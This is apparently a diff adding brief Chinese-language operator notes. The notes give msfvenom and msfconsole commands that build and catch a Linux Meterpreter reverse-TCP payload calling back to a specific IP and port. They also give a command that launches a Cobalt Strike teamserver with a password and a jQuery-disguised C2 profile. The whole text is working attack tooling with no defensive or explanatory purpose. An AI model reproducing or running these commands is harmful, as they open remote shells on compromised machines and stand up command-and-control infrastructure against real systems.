@@ -1,0 +1,11 @@
+生成linux:msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=43.142.255.132 LPORT=8812 -f elf > s.elf
+          
+监听：msfconsole
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set lhost 43.142.255.132
+set lport 8812
+run
+
+服务器启动cs
+./teamserver 43.142.255.132 1542576819zfY ./jquery-c2.4.5.profile
